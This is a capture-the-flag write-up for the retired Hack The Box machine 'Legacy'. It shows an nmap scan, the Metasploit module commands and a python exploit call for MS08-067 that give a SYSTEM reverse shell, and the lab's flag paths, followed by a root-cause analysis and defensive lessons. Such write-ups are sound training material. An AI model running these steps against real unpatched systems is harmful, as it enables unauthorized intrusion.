# HTB - Legacy (Retired)

## Machine Information

| Field | Value |
|------|------|
| Machine Name | Legacy |
| Platform | Hack The Box |
| Difficulty | Easy |
| OS | Windows |
| IP | 10.129.x.x |

---

## Disclaimer

This write-up is for educational purposes only.  
The machine is retired from Hack The Box and no longer active.

---

# Attack Path

1. Perform a full TCP port scan
2. Identify SMB service running on Windows XP
3. Detect vulnerability **MS08-067 (CVE-2008-4250)**
4. Exploit the vulnerability to gain SYSTEM shell
5. Retrieve user and root flags

---

# Reconnaissance

## Nmap Scan

```bash
nmap -Pn -sS -sV -p- 10.129.x.x
```
### Result
```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```
The open SMB port suggests a Windows file sharing service.

## Enumeration

Further enumeration indicates the machine is running Windows XP.

This OS is known to be vulnerable to:
<br>**CVE-2008-4250 (MS08-067)**

A remote code execution vulnerability in the Windows Server service.

## Exploitation
### Exploit Used
MS08-067 Remote Code Execution
<br>Example exploit execution:
```
python ms08_067_exploit.py 10.129.x.x
```
Alternatively using Metasploit:
```
msfconsole
```
```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.129.x.x
set LHOST <your_ip>
run
```

## Foothole
After running the exploit, a reverse shell is obtained
verify access:
```
whoami
```
output:
```
nt authority\system
```
The exploit directly povides SYSTEM-level access

## Flags
### User Flag
```C:\Documents and Settings\john\Desktop\user.txt```
### Root Flag
```C:\Documents and Settings\Administrator\Desktop\root.txt```

## Vulnerability Analysis: MS08-067 (NetAPI)
The MS08-067 vulnerability (CVE-2008-4250) is a critical remote code execution (RCE) flaw in the Server Service of Windows systems. This exploit allows an attacker to take full control of a target system without any user authentication.

1. Technical Root Cause: Path Canonicalization
The flaw exists in the Netapi32.dll library, specifically within the NetpwPathCanonicalize() function. This function is responsible for "cleaning up" or normalizing file paths (e.g., converting \ to / or resolving .. directories).

   - Mechanism: When a specially crafted RPC (Remote Procedure Call) request is sent to the Server Service, the path normalization logic fails.

   - Stack-based Buffer Overflow: Due to improper bounds checking, an attacker can send a malformed path string that overflows the stack buffer.

2. Exploitation: Overwriting the Return Address
By carefully controlling the overflow, the attacker can overwrite the Return Address on the stack.

   - Arbitrary Code Execution: The overwritten address directs the CPU to execute the attacker's "shellcode" (in this case, the Metasploit payload) instead of the original program flow.

   - SYSTEM Privileges: Since the Server Service runs under the SYSTEM account, the attacker gains the highest level of administrative access to the machine.

3. Why it succeeded on "Legacy"
The "Legacy" box represents an unpatched Windows XP/2003 system. These versions are particularly vulnerable because:

   - Lack of Modern Protections: They often lack modern memory mitigations like ASLR (Address Space Layout Randomization) and DEP (Data Execution Prevention), making it very easy for the exploit to predict memory addresses and execute shellcode reliably.

## Lesson Learned (Refined for MS08-067)
Beyond the basic advice of "patching," here are the deeper security insights from this lab:

- Attack Surface Reduction: The Server Service is essential for file and printer sharing, but it also exposes the system to high-risk RPC calls. If file sharing isn't required, disabling the Server Service or blocking Ports 139/445 at the firewall level is a critical defense-in-depth measure.

- Legacy OS Risks: Running End-of-Life (EOL) operating systems like Windows XP is inherently dangerous because they no longer receive security updates for "Zero-day" or even well-known vulnerabilities like this one.

- Vulnerability Scanning: Using tools like Nmap with the --script smb-vuln-ms08-067 flag is crucial during internal audits to identify unpatched systems before an attacker does.
## Tools Used
- Nmap
- Metasploit
- Python exploit
  
## References
https://nvd.nist.gov/vuln/detail/CVE-2008-4250<br>
https://www.exploit-db.com/exploits/40279